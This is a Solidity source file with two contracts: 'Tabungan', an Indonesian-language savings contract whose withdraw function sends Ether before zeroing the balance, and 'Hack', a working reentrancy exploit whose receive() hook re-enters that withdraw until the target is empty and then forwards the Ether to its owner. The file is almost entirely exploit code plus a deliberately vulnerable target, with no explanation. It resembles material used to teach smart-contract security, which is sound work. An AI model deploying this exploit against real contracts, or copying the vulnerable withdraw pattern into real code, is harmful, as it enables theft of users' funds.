// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./Ownable.sol";

contract Hack is Ownable(msg.sender) {
  Tabungan public target;

  constructor(Tabungan tabunganContractAddress) {
    target = tabunganContractAddress;
  }

  function checkBalance() public view returns (uint256) {
    return address(target).balance;
  }

  function setor() external payable onlyOwner {
    target.setor{value: msg.value}();
  }

  function hack() external payable onlyOwner  {
    target.ambil();
  }

  receive() external payable {
    if (address(target).balance > 0) {
      target.ambil();
    } else {
      payable(owner()).transfer(address(this).balance);
    }
  }
}

contract Tabungan {
    mapping(address => uint) public balances;
    function setor() public payable {
        require(msg.value > 0, 'Mana uangnya!?');
        balances[msg.sender] += msg.value;
    }
    function ambil() public {
        uint balance = balances[msg.sender];
        require(balance > 0, 'Anda tidak punya uang tabungan!');
        (bool resp,) = msg.sender.call{value: balance}("");
        require(resp, 'gagal mengirim uang!');
        balances[msg.sender] = 0;
    }
}
